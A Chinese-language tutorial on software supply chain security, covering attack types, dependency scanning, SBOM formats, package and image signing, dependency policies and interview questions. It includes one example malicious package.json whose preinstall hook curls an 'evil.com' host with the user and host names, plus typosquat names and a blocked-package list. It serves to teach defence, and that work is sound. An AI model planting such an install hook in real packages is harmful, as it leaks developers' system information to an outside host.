---
title: 软件供应链安全
description: 学习软件供应链安全和依赖管理
track: security
section: appsec
difficulty: intermediate
tags:
  - 供应链安全
  - 依赖
  - SBOM
  - 漏洞扫描
status: imported
origin: old/src/content/docs/security/supply-chain.zh.md
divergence: 0.21
issues:
  - title-lang-en
  - title-language
legacy:
  category: Security
  subcategory: AppSec
  order: 19
  lastUpdated: 2026-01-07
---

软件供应链安全已成为现代应用安全中最关键的领域之一。随着开源软件的广泛使用，一个典型的应用程序可能包含数百甚至数千个第三方依赖。这些依赖中的任何一个被入侵，都可能导致整个应用程序的安全性受到威胁。从 SolarWinds 事件到 Log4Shell 漏洞，供应链攻击已经证明其破坏力巨大。本文将系统性地介绍软件供应链安全的各个方面，帮助您构建安全可靠的软件供应链。

## 供应链风险概述

### 软件供应链攻击面

现代软件开发的供应链涉及多个环节，每个环节都可能成为攻击目标：

```
┌─────────────────────────────────────────────────────────────────┐
│                     软件供应链攻击面                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐           │
│  │   源代码层    │  │   构建层      │  │   分发层      │           │
│  ├──────────────┤  ├──────────────┤  ├──────────────┤           │
│  │ • 恶意提交    │  │ • 构建系统入侵 │  │ • 仓库劫持    │           │
│  │ • 依赖混淆    │  │ • CI/CD 注入  │  │ • 包替换攻击  │           │
│  │ • Typosquatting│ │ • 编译器后门  │  │ • CDN 劫持   │           │
│  │ • 账户劫持    │  │ • 构建脚本篡改 │  │ • 镜像污染    │           │
│  └──────────────┘  └──────────────┘  └──────────────┘           │
│                                                                  │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐           │
│  │   依赖层      │  │   运行时层    │  │   更新层      │           │
│  ├──────────────┤  ├──────────────┤  ├──────────────┤           │
│  │ • 恶意依赖    │  │ • 动态加载攻击│  │ • 自动更新劫持│           │
│  │ • 传递依赖漏洞│  │ • 插件注入    │  │ • 版本回退攻击│           │
│  │ • 许可证风险  │  │ • 配置注入    │  │ • 更新服务器  │           │
│  └──────────────┘  └──────────────┘  │   入侵        │           │
│                                       └──────────────┘           │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 常见供应链攻击类型

#### 依赖混淆攻击 (Dependency Confusion)

攻击者在公共包仓库发布与内部包同名的恶意包，利用包管理器的优先级规则进行攻击：

```
攻击流程：
1. 攻击者发现目标公司使用私有包 "company-utils"
2. 在 npm/PyPI 公共仓库发布同名包 "company-utils"
3. 设置更高版本号（如 99.0.0）
4. 开发者运行 npm install，包管理器优先拉取公共高版本包
5. 恶意代码在安装时执行，窃取敏感信息
```

```javascript
// 恶意包的 package.json 示例
{
  "name": "company-utils",
  "version": "99.0.0",
  "scripts": {
    "preinstall": "curl https://evil.com/collect?data=$(whoami)@$(hostname)"
  }
}
```

#### Typosquatting 攻击

攻击者注册与流行包名称相似的恶意包：

```
常见 Typosquatting 示例：
正确包名          恶意包名
lodash           lodahs, lodash-utils, 1odash
express          expres, expresss, express-js
requests (Python) request, requets
```

#### 恶意维护者攻击

攻击者接管合法包的维护权限后植入恶意代码：

```
攻击链路：
1. 攻击者通过钓鱼获取维护者 npm/PyPI 账户凭证
2. 或者说服原维护者转让项目所有权
3. 发布包含恶意代码的新版本
4. 所有使用该包的项目在更新时被感染
```

### 真实案例分析

#### SolarWinds 供应链攻击 (2020)

```
攻击规模：影响超过 18,000 个组织，包括美国政府机构

攻击过程：
1. 攻击者入侵 SolarWinds 的构建系统
2. 在 Orion 软件的构建过程中注入后门
3. 后门代码通过正常软件更新分发给客户
4. 恶意代码伪装成合法网络流量，难以检测

教训：
- 需要保护整个构建流程
- 代码签名不能防止构建时注入
- 需要多层防御和检测机制
```

#### Log4Shell 漏洞 (CVE-2021-44228)

```
影响范围：全球数百万 Java 应用程序

漏洞详情：
- Log4j 2.x 版本中的 JNDI 注入漏洞
- 允许远程代码执行
- 作为传递依赖存在于大量项目中

教训：
- 传递依赖也是重要的攻击面
- 需要完整的依赖清单 (SBOM)
- 漏洞响应需要快速识别受影响的系统
```

## 依赖扫描

### 开源依赖扫描工具

#### npm audit

```bash
# 检查 npm 项目的漏洞
npm audit

# 生成详细的 JSON 报告
npm audit --json > audit-report.json

# 自动修复可修复的漏洞
npm audit fix

# 强制更新主版本（可能破坏兼容性）
npm audit fix --force

# 只查看生产依赖的漏洞
npm audit --production
```

#### Snyk CLI

```bash
# 安装 Snyk CLI
npm install -g snyk

# 认证
snyk auth

# 测试项目漏洞
snyk test

# 持续监控项目
snyk monitor

# 测试特定包
snyk test express@4.17.1

# 测试 Docker 镜像
snyk container test myapp:latest

# 测试基础设施即代码
snyk iac test kubernetes/

# 生成 HTML 报告
snyk test --json | snyk-to-html -o results.html
```

#### OWASP Dependency-Check

```bash
# 使用 Docker 运行
docker run --rm \
    -v $(pwd):/src \
    -v $(pwd)/reports:/reports \
    owasp/dependency-check \
    --scan /src \
    --format "HTML" \
    --project "MyProject" \
    --out /reports

# Maven 集成
mvn org.owasp:dependency-check-maven:check

# Gradle 集成
./gradlew dependencyCheckAnalyze
```

```xml
<!-- Maven pom.xml 配置 -->
<plugin>
    <groupId>org.owasp</groupId>
    <artifactId>dependency-check-maven</artifactId>
    <version>9.0.0</version>
    <configuration>
        <failBuildOnCVSS>7</failBuildOnCVSS>
        <suppressionFile>suppression.xml</suppressionFile>
    </configuration>
    <executions>
        <execution>
            <goals>
                <goal>check</goal>
            </goals>
        </execution>
    </executions>
</plugin>
```

### CI/CD 集成扫描

#### GitHub Actions 集成

```yaml
# .github/workflows/security-scan.yml
name: Security Scan

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]
  schedule:
    # 每天凌晨 2 点运行
    - cron: '0 2 * * *'

jobs:
  dependency-scan:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Install dependencies
        run: npm ci

      # npm audit 扫描
      - name: Run npm audit
        run: npm audit --audit-level=high

      # Snyk 扫描
      - name: Run Snyk to check for vulnerabilities
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high

      # Trivy 文件系统扫描
      - name: Run Trivy vulnerability scanner
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: 'fs'
          scan-ref: '.'
          severity: 'CRITICAL,HIGH'
          exit-code: '1'

  container-scan:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Build Docker image
        run: docker build -t myapp:${{ github.sha }} .

      - name: Scan Docker image with Trivy
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'myapp:${{ github.sha }}'
          format: 'sarif'
          output: 'trivy-results.sarif'
          severity: 'CRITICAL,HIGH'

      - name: Upload Trivy scan results to GitHub Security
        uses: github/codeql-action/upload-sarif@v2
        with:
          sarif_file: 'trivy-results.sarif'
```

#### GitLab CI/CD 集成

```yaml
# .gitlab-ci.yml
stages:
  - test
  - security
  - build

variables:
  SECURE_LOG_LEVEL: info

# 依赖扫描
dependency_scanning:
  stage: security
  image: node:20-alpine
  script:
    - npm ci
    - npm audit --json > npm-audit.json || true
  artifacts:
    reports:
      dependency_scanning: npm-audit.json
    paths:
      - npm-audit.json

# Trivy 容器扫描
container_scanning:
  stage: security
  image:
    name: aquasec/trivy:latest
    entrypoint: [""]
  script:
    - trivy image --exit-code 0 --severity HIGH,CRITICAL --format json -o trivy-report.json $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
  artifacts:
    reports:
      container_scanning: trivy-report.json

# SAST 静态分析
sast:
  stage: security
  image: returntocorp/semgrep
  script:
    - semgrep --config=auto --json --output=semgrep-report.json .
  artifacts:
    reports:
      sast: semgrep-report.json
```

### 漏洞优先级评估

```python
# 漏洞优先级评估脚本示例
import json
from dataclasses import dataclass
from enum import Enum

class Severity(Enum):
    CRITICAL = 4
    HIGH = 3
    MEDIUM = 2
    LOW = 1

class Exploitability(Enum):
    ACTIVELY_EXPLOITED = 4
    POC_AVAILABLE = 3
    THEORETICAL = 2
    UNKNOWN = 1

@dataclass
class Vulnerability:
    cve_id: str
    severity: Severity
    cvss_score: float
    exploitability: Exploitability
    is_direct_dependency: bool
    has_fix_available: bool
    affected_component: str

def calculate_priority_score(vuln: Vulnerability) -> float:
    """计算漏洞优先级分数"""
    base_score = vuln.cvss_score

    # 可利用性加权
    exploitability_weight = {
        Exploitability.ACTIVELY_EXPLOITED: 2.0,
        Exploitability.POC_AVAILABLE: 1.5,
        Exploitability.THEORETICAL: 1.0,
        Exploitability.UNKNOWN: 0.8,
    }
    base_score *= exploitability_weight[vuln.exploitability]

    # 直接依赖优先处理
    if vuln.is_direct_dependency:
        base_score *= 1.3

    # 有修复方案优先处理（更容易修复）
    if vuln.has_fix_available:
        base_score *= 1.2

    return min(base_score, 10.0)  # 最高分 10

def prioritize_vulnerabilities(vulns: list[Vulnerability]) -> list[Vulnerability]:
    """按优先级排序漏洞列表"""
    return sorted(vulns, key=lambda v: calculate_priority_score(v), reverse=True)

# 使用示例
vulnerabilities = [
    Vulnerability(
        cve_id="CVE-2021-44228",
        severity=Severity.CRITICAL,
        cvss_score=10.0,
        exploitability=Exploitability.ACTIVELY_EXPLOITED,
        is_direct_dependency=False,
        has_fix_available=True,
        affected_component="log4j-core"
    ),
    Vulnerability(
        cve_id="CVE-2023-12345",
        severity=Severity.HIGH,
        cvss_score=7.5,
        exploitability=Exploitability.POC_AVAILABLE,
        is_direct_dependency=True,
        has_fix_available=True,
        affected_component="express"
    ),
]

prioritized = prioritize_vulnerabilities(vulnerabilities)
for vuln in prioritized:
    print(f"{vuln.cve_id}: 优先级分数 {calculate_priority_score(vuln):.2f}")
```

## 软件物料清单 (SBOM)

### SBOM 概述

软件物料清单 (Software Bill of Materials) 是软件组件的完整清单，类似于制造业中的物料清单。SBOM 对于供应链安全至关重要：

```
SBOM 的价值：
1. 漏洞响应 - 快速识别受影响的组件
2. 许可证合规 - 追踪开源许可证义务
3. 供应链透明 - 了解软件的完整构成
4. 风险评估 - 评估第三方组件的风险
5. 法规遵从 - 满足政府和行业要求
```

### SBOM 格式标准

#### SPDX (Software Package Data Exchange)

```json
{
  "spdxVersion": "SPDX-2.3",
  "dataLicense": "CC0-1.0",
  "SPDXID": "SPDXRef-DOCUMENT",
  "name": "myapp-sbom",
  "documentNamespace": "https://example.com/myapp-1.0.0",
  "creationInfo": {
    "created": "2024-01-15T10:00:00Z",
    "creators": [
      "Tool: syft-0.100.0",
      "Organization: Example Corp"
    ]
  },
  "packages": [
    {
      "SPDXID": "SPDXRef-Package-npm-express-4.18.2",
      "name": "express",
      "versionInfo": "4.18.2",
      "packageFileName": "express-4.18.2.tgz",
      "downloadLocation": "https://registry.npmjs.org/express/-/express-4.18.2.tgz",
      "checksums": [
        {
          "algorithm": "SHA256",
          "checksumValue": "abc123..."
        }
      ],
      "licenseConcluded": "MIT",
      "licenseDeclared": "MIT",
      "copyrightText": "Copyright (c) 2009-2014 TJ Holowaychuk",
      "externalRefs": [
        {
          "referenceCategory": "PACKAGE-MANAGER",
          "referenceType": "npm",
          "referenceLocator": "express@4.18.2"
        },
        {
          "referenceCategory": "SECURITY",
          "referenceType": "cpe23Type",
          "referenceLocator": "cpe:2.3:a:expressjs:express:4.18.2:*:*:*:*:node.js:*:*"
        }
      ]
    }
  ],
  "relationships": [
    {
      "spdxElementId": "SPDXRef-DOCUMENT",
      "relatedSpdxElement": "SPDXRef-Package-npm-express-4.18.2",
      "relationshipType": "DESCRIBES"
    }
  ]
}
```

#### CycloneDX

```json
{
  "bomFormat": "CycloneDX",
  "specVersion": "1.5",
  "serialNumber": "urn:uuid:3e671687-395b-41f5-a30f-a58921a69b79",
  "version": 1,
  "metadata": {
    "timestamp": "2024-01-15T10:00:00Z",
    "tools": [
      {
        "vendor": "Anchore",
        "name": "syft",
        "version": "0.100.0"
      }
    ],
    "component": {
      "type": "application",
      "name": "myapp",
      "version": "1.0.0"
    }
  },
  "components": [
    {
      "type": "library",
      "bom-ref": "pkg:npm/express@4.18.2",
      "name": "express",
      "version": "4.18.2",
      "purl": "pkg:npm/express@4.18.2",
      "licenses": [
        {
          "license": {
            "id": "MIT"
          }
        }
      ],
      "hashes": [
        {
          "alg": "SHA-256",
          "content": "abc123..."
        }
      ],
      "externalReferences": [
        {
          "type": "website",
          "url": "https://expressjs.com"
        },
        {
          "type": "vcs",
          "url": "https://github.com/expressjs/express"
        }
      ]
    }
  ],
  "dependencies": [
    {
      "ref": "pkg:npm/myapp@1.0.0",
      "dependsOn": [
        "pkg:npm/express@4.18.2"
      ]
    }
  ],
  "vulnerabilities": [
    {
      "id": "CVE-2024-12345",
      "source": {
        "name": "NVD",
        "url": "https://nvd.nist.gov/"
      },
      "ratings": [
        {
          "source": {
            "name": "NVD"
          },
          "score": 7.5,
          "severity": "high",
          "method": "CVSSv31"
        }
      ],
      "affects": [
        {
          "ref": "pkg:npm/express@4.18.2"
        }
      ]
    }
  ]
}
```

### SBOM 生成工具

#### Syft - 多语言 SBOM 生成器

```bash
# 安装 Syft
curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin

# 从目录生成 SBOM
syft dir:./myapp -o spdx-json > sbom.spdx.json

# 从容器镜像生成 SBOM
syft myapp:latest -o cyclonedx-json > sbom.cdx.json

# 支持多种输出格式
syft . -o spdx              # SPDX tag-value
syft . -o spdx-json         # SPDX JSON
syft . -o cyclonedx         # CycloneDX XML
syft . -o cyclonedx-json    # CycloneDX JSON
syft . -o table             # 人类可读表格
syft . -o json              # Syft 原生 JSON

# 从 Dockerfile 生成 SBOM
syft docker:myapp:latest -o cyclonedx-json
```

#### 使用 Grype 进行 SBOM 漏洞扫描

```bash
# 安装 Grype
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin

# 直接扫描目录
grype dir:./myapp

# 使用 SBOM 进行扫描
grype sbom:sbom.cdx.json

# 只显示高危漏洞
grype sbom:sbom.cdx.json --only-fixed --fail-on high

# 输出 JSON 格式
grype sbom:sbom.cdx.json -o json > vulnerabilities.json
```

### SBOM 管理流程

```yaml
# GitHub Actions SBOM 生成和管理流程
name: SBOM Management

on:
  push:
    branches: [main]
  release:
    types: [published]

jobs:
  generate-sbom:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Install Syft
        run: |
          curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin

      - name: Generate SBOM
        run: |
          syft dir:. -o spdx-json > sbom.spdx.json
          syft dir:. -o cyclonedx-json > sbom.cdx.json

      - name: Install Grype
        run: |
          curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin

      - name: Scan SBOM for vulnerabilities
        run: |
          grype sbom:sbom.cdx.json -o json > vulnerability-report.json

      - name: Upload SBOM as artifact
        uses: actions/upload-artifact@v3
        with:
          name: sbom
          path: |
            sbom.spdx.json
            sbom.cdx.json
            vulnerability-report.json

      - name: Attach SBOM to release
        if: github.event_name == 'release'
        uses: softprops/action-gh-release@v1
        with:
          files: |
            sbom.spdx.json
            sbom.cdx.json
```

## Dependabot 和 Snyk

### GitHub Dependabot 配置

```yaml
# .github/dependabot.yml
version: 2
updates:
  # npm 依赖更新
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
      day: "monday"
      time: "09:00"
      timezone: "Asia/Shanghai"
    open-pull-requests-limit: 10
    reviewers:
      - "security-team"
    labels:
      - "dependencies"
      - "security"
    # 忽略特定依赖的主版本更新
    ignore:
      - dependency-name: "lodash"
        update-types: ["version-update:semver-major"]
    # 将安全更新分组
    groups:
      security-updates:
        applies-to: security-updates
        patterns:
          - "*"
      minor-updates:
        applies-to: version-updates
        update-types:
          - "minor"
          - "patch"

  # Docker 镜像更新
  - package-ecosystem: "docker"
    directory: "/"
    schedule:
      interval: "weekly"
    labels:
      - "docker"
      - "dependencies"

  # GitHub Actions 更新
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    labels:
      - "ci"
      - "dependencies"

  # Python 依赖更新
  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "daily"
    # 安全更新优先
    open-pull-requests-limit: 5
    # 使用 requirements.txt
    allow:
      - dependency-type: "direct"
```

### Snyk 配置

```yaml
# .snyk 策略文件
version: v1.25.0
language-settings:
  python:
    # Python 版本
    python: "3.11"
ignore:
  # 忽略特定漏洞直到指定日期
  SNYK-JS-LODASH-1018905:
    - '*':
        reason: '等待上游修复，已有缓解措施'
        expires: 2024-06-01T00:00:00.000Z

  # 忽略测试依赖中的漏洞
  SNYK-JS-JEST-1234567:
    - 'jest > *':
        reason: '仅影响开发环境'

patch:
  # 应用 Snyk 补丁
  SNYK-JS-LODASH-567890:
    - lodash:
        patched: '2024-01-15T00:00:00.000Z'
```

```javascript
// snyk.config.js - Snyk 高级配置
module.exports = {
  // 自定义严重性阈值
  severity: 'high',

  // 排除的路径
  exclude: [
    'test/',
    'docs/',
    '__mocks__/'
  ],

  // 策略路径
  'policy-path': '.snyk',

  // 项目名称
  'project-name': 'myapp-production',

  // 组织设置
  org: 'my-org',

  // 远程仓库 URL
  'remote-repo-url': 'https://github.com/myorg/myapp',

  // 自定义规则
  rules: {
    'no-vulnerable-packages': {
      severity: 'error',
      cvss: {
        min: 7.0
      }
    }
  }
};
```

### 自动化修复工作流

```yaml
# .github/workflows/auto-fix-vulnerabilities.yml
name: Auto Fix Vulnerabilities

on:
  schedule:
    - cron: '0 6 * * 1'  # 每周一早上 6 点
  workflow_dispatch:

jobs:
  auto-fix:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        with:
          token: ${{ secrets.PAT_TOKEN }}

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Install dependencies
        run: npm ci

      - name: Run npm audit fix
        run: |
          npm audit fix --force || true

      - name: Run Snyk fix
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        run: |
          npx snyk wizard --trust-policies || true

      - name: Check for changes
        id: git-check
        run: |
          git diff --exit-code || echo "changes=true" >> $GITHUB_OUTPUT

      - name: Create Pull Request
        if: steps.git-check.outputs.changes == 'true'
        uses: peter-evans/create-pull-request@v5
        with:
          token: ${{ secrets.PAT_TOKEN }}
          commit-message: 'fix: 自动修复安全漏洞'
          title: '[Security] 自动安全漏洞修复'
          body: |
            ## 自动安全修复

            此 PR 由自动化工作流创建，包含以下修复：
            - npm audit fix 的修复
            - Snyk 建议的修复

            请审查更改并确保所有测试通过。
          branch: auto-security-fix
          labels: |
            security
            automated
```

## 包签名

### npm 包签名

```bash
# npm 包签名和验证（使用 Sigstore）

# 发布带签名的包
npm publish --provenance

# 验证包的来源
npm audit signatures

# 查看包的签名信息
npm view express signatures
```

```json
// package.json 中启用来源声明
{
  "name": "my-package",
  "version": "1.0.0",
  "publishConfig": {
    "provenance": true
  }
}
```

### 使用 Cosign 进行容器镜像签名

```bash
# 安装 Cosign
curl -sSfL https://github.com/sigstore/cosign/releases/latest/download/cosign-linux-amd64 -o /usr/local/bin/cosign
chmod +x /usr/local/bin/cosign

# 生成密钥对
cosign generate-key-pair

# 签名容器镜像
cosign sign --key cosign.key myregistry.io/myapp:v1.0.0

# 无密钥签名（使用 OIDC 身份）
cosign sign myregistry.io/myapp:v1.0.0

# 验证镜像签名
cosign verify --key cosign.pub myregistry.io/myapp:v1.0.0

# 验证使用 Sigstore 公共实例签名的镜像
cosign verify \
  --certificate-identity=user@example.com \
  --certificate-oidc-issuer=https://accounts.google.com \
  myregistry.io/myapp:v1.0.0

# 添加签名附加信息
cosign sign --key cosign.key \
  -a "commit=$(git rev-parse HEAD)" \
  -a "build-time=$(date -u +'%Y-%m-%dT%H:%M:%SZ')" \
  myregistry.io/myapp:v1.0.0

# 验证附加信息
cosign verify --key cosign.pub \
  -a "commit=abc123" \
  myregistry.io/myapp:v1.0.0
```

### Kubernetes 镜像签名验证

```yaml
# 使用 Sigstore Policy Controller 验证签名
apiVersion: policy.sigstore.dev/v1alpha1
kind: ClusterImagePolicy
metadata:
  name: require-signed-images
spec:
  images:
    - glob: "myregistry.io/**"
  authorities:
    - keyless:
        identities:
          - issuer: https://accounts.google.com
            subject: deploy@mycompany.iam.gserviceaccount.com
    - key:
        data: |
          -----BEGIN PUBLIC KEY-----
          MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE...
          -----END PUBLIC KEY-----
---
# 命名空间级别策略
apiVersion: policy.sigstore.dev/v1alpha1
kind: ImagePolicy
metadata:
  name: production-policy
  namespace: production
spec:
  images:
    - glob: "*"
  authorities:
    - keyless:
        identities:
          - issuer: https://github.com/login/oauth
            subject: https://github.com/myorg/myrepo/.github/workflows/build.yml@refs/heads/main
```

### Git 提交签名

```bash
# 配置 GPG 签名
git config --global user.signingkey YOUR_GPG_KEY_ID
git config --global commit.gpgsign true

# 创建签名提交
git commit -S -m "feat: 添加新功能"

# 创建签名标签
git tag -s v1.0.0 -m "Release v1.0.0"

# 验证提交签名
git verify-commit HEAD
git log --show-signature

# 验证标签签名
git verify-tag v1.0.0
```

```yaml
# GitHub Actions 中使用 GPG 签名
name: Release

on:
  push:
    tags:
      - 'v*'

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Import GPG key
        uses: crazy-max/ghaction-import-gpg@v6
        with:
          gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
          passphrase: ${{ secrets.GPG_PASSPHRASE }}
          git_user_signingkey: true
          git_commit_gpgsign: true

      - name: Create signed release
        run: |
          git tag -s -f ${{ github.ref_name }} -m "Release ${{ github.ref_name }}"
          git push --tags --force
```

## 安全策略

### 依赖管理策略

```yaml
# dependency-policy.yaml - 依赖管理策略定义
apiVersion: security.example.com/v1
kind: DependencyPolicy
metadata:
  name: production-dependency-policy
spec:
  # 允许的依赖来源
  allowedSources:
    - registry: "https://registry.npmjs.org"
      scope: "@company/*"
      requireSignature: true
    - registry: "https://npm.pkg.github.com"
      scope: "*"
      requireSignature: true

  # 禁止的依赖
  blockedPackages:
    - name: "event-stream"
      reason: "历史恶意代码注入"
    - name: "colors"
      version: ">1.4.0"
      reason: "维护者故意破坏"

  # 许可证策略
  licensePolicy:
    allowed:
      - MIT
      - Apache-2.0
      - BSD-2-Clause
      - BSD-3-Clause
      - ISC
    denied:
      - GPL-3.0
      - AGPL-3.0
      - SSPL-1.0
    requireReview:
      - LGPL-2.1
      - MPL-2.0

  # 漏洞策略
  vulnerabilityPolicy:
    # 阻止部署的严重级别
    blockOnSeverity: high
    # 允许的最大漏洞数
    maxAllowedVulnerabilities:
      critical: 0
      high: 0
      medium: 5
      low: 20
    # 豁免列表
    exemptions:
      - cve: "CVE-2021-12345"
        expiry: "2024-06-01"
        reason: "等待上游修复"
        ticket: "JIRA-1234"

  # 依赖更新策略
  updatePolicy:
    # 安全更新自动合并
    autoMergeSecurityUpdates: true
    # 要求代码审查的更新类型
    requireReview:
      - major
      - security
    # 更新频率
    updateFrequency: weekly
```

### 安全门禁配置

```yaml
# .github/workflows/security-gate.yml
name: Security Gate

on:
  pull_request:
    branches: [main, release/*]

jobs:
  security-checks:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Dependency License Check
        uses: fossa-contrib/fossa-action@v2
        with:
          api-key: ${{ secrets.FOSSA_API_KEY }}

      - name: Check for blocked dependencies
        run: |
          # 检查是否包含禁止的依赖
          BLOCKED_DEPS=("event-stream" "colors@2" "ua-parser-js@0.7.29")
          for dep in "${BLOCKED_DEPS[@]}"; do
            if grep -q "$dep" package-lock.json; then
              echo "错误: 发现禁止的依赖 $dep"
              exit 1
            fi
          done

      - name: SBOM Generation and Validation
        run: |
          syft dir:. -o cyclonedx-json > sbom.json
          # 验证 SBOM 完整性
          grype sbom:sbom.json --fail-on high

      - name: Vulnerability Threshold Check
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        run: |
          snyk test --severity-threshold=high --json > snyk-report.json || true

          # 检查漏洞数量
          CRITICAL=$(jq '.vulnerabilities | map(select(.severity=="critical")) | length' snyk-report.json)
          HIGH=$(jq '.vulnerabilities | map(select(.severity=="high")) | length' snyk-report.json)

          if [ "$CRITICAL" -gt 0 ]; then
            echo "错误: 发现 $CRITICAL 个严重漏洞"
            exit 1
          fi

          if [ "$HIGH" -gt 5 ]; then
            echo "错误: 高危漏洞数量超过阈值 ($HIGH > 5)"
            exit 1
          fi

      - name: Container Image Signature Verification
        if: contains(github.event.pull_request.labels.*.name, 'container')
        run: |
          cosign verify --key cosign.pub ${{ env.IMAGE_REF }} || exit 1
```

### 应急响应流程

```markdown
# 供应链安全事件响应流程

## 检测和警报
- 监控安全公告和漏洞数据库
- 配置自动化扫描和告警
- 订阅关键依赖的安全通知

## 评估影响范围
- 使用 SBOM 快速识别受影响的系统
- 确定漏洞是否在生产环境中被利用
- 评估数据泄露风险

## 遏制措施
- 如果正在被利用，考虑临时下线受影响系统
- 阻止进一步的漏洞利用
- 保留证据用于后续分析

## 修复和恢复
- 更新受影响的依赖
- 如果没有补丁可用，实施临时缓解措施
- 部署修复后进行全面测试

## 事后总结
- 记录事件时间线
- 分析根本原因
- 更新安全策略和流程
```

```yaml
# incident-response.yaml - 事件响应自动化
name: Security Incident Response

on:
  repository_dispatch:
    types: [security-incident]

jobs:
  respond:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Analyze impact
        run: |
          # 获取 SBOM
          syft dir:. -o cyclonedx-json > sbom.json

          # 检查受影响的组件
          AFFECTED_CVE="${{ github.event.client_payload.cve }}"
          grype sbom:sbom.json --only-fixed | grep "$AFFECTED_CVE" > impact-report.txt

      - name: Create incident issue
        uses: actions/github-script@v7
        with:
          script: |
            const fs = require('fs');
            const impact = fs.readFileSync('impact-report.txt', 'utf8');

            await github.rest.issues.create({
              owner: context.repo.owner,
              repo: context.repo.repo,
              title: `[安全事件] ${{ github.event.client_payload.cve }}`,
              body: `## 安全事件通知\n\nCVE: ${{ github.event.client_payload.cve }}\n严重级别: ${{ github.event.client_payload.severity }}\n\n### 影响分析\n\`\`\`\n${impact}\n\`\`\`\n\n### 下一步行动\n- [ ] 评估实际影响\n- [ ] 测试修复版本\n- [ ] 部署修复\n- [ ] 验证修复`,
              labels: ['security', 'incident', 'priority-high']
            });

      - name: Notify security team
        uses: slackapi/slack-github-action@v1
        with:
          payload: |
            {
              "text": "安全事件警报",
              "blocks": [
                {
                  "type": "section",
                  "text": {
                    "type": "mrkdwn",
                    "text": "*安全事件*: ${{ github.event.client_payload.cve }}\n*严重级别*: ${{ github.event.client_payload.severity }}"
                  }
                }
              ]
            }
        env:
          SLACK_WEBHOOK_URL: ${{ secrets.SLACK_SECURITY_WEBHOOK }}
```

## 面试要点

### 核心概念题

**Q1: 什么是软件供应链攻击？列举常见的攻击类型。**

```
答案要点：

1. 定义：
   - 通过入侵软件开发、构建或分发过程中的任何环节来攻击最终用户
   - 利用软件依赖关系和信任链进行攻击

2. 常见攻击类型：
   - 依赖混淆 (Dependency Confusion)
   - Typosquatting（仿冒包名）
   - 恶意维护者攻击
   - 构建系统入侵
   - 证书/签名密钥泄露
   - 第三方服务入侵

3. 著名案例：
   - SolarWinds (2020)
   - Codecov (2021)
   - Log4Shell (2021)
   - ua-parser-js 事件 (2021)
```

**Q2: 什么是 SBOM？为什么它对供应链安全很重要？**

```
答案要点：

1. SBOM 定义：
   - Software Bill of Materials，软件物料清单
   - 软件组件的完整清单，包括版本、许可证、来源等信息

2. 主要格式：
   - SPDX (Linux Foundation)
   - CycloneDX (OWASP)
   - SWID Tags

3. 重要性：
   - 快速识别受漏洞影响的系统
   - 许可证合规管理
   - 供应链透明度
   - 法规遵从（如美国行政命令 14028）
   - 风险评估和管理

4. 生成工具：
   - Syft、Trivy、cyclonedx-cli
```

**Q3: 如何防止依赖混淆攻击？**

```
答案要点：

1. 配置私有仓库优先：
   - npm: 使用 .npmrc 配置 registry
   - pip: 使用 --index-url 和 --extra-index-url
   - Maven: 配置 mirror 优先级

2. 使用命名空间/作用域：
   - npm: @company/package-name
   - Python: 使用私有命名空间

3. 锁定依赖版本：
   - 使用 lock 文件
   - 固定精确版本号

4. 包完整性验证：
   - 验证包的 hash/签名
   - 使用 Subresource Integrity

5. 仓库配置：
   - 在私有仓库中占位公共包名
   - 使用仓库代理而非直接访问公共仓库
```

### 实践场景题

**Q4: 设计一个完整的依赖安全扫描流程**

```yaml
# 答案示例：完整的依赖安全扫描 CI/CD 流程

name: Comprehensive Dependency Security

on:
  push:
    branches: [main]
  pull_request:
  schedule:
    - cron: '0 2 * * *'

jobs:
  # 第一阶段：依赖审计
  dependency-audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Install dependencies
        run: npm ci

      - name: npm audit
        run: npm audit --audit-level=moderate

      - name: License check
        run: npx license-checker --production --onlyAllow "MIT;Apache-2.0;BSD-2-Clause;BSD-3-Clause;ISC"

  # 第二阶段：SBOM 生成
  generate-sbom:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Generate SBOM
        uses: anchore/sbom-action@v0
        with:
          format: cyclonedx-json
          output-file: sbom.cdx.json

      - name: Upload SBOM
        uses: actions/upload-artifact@v3
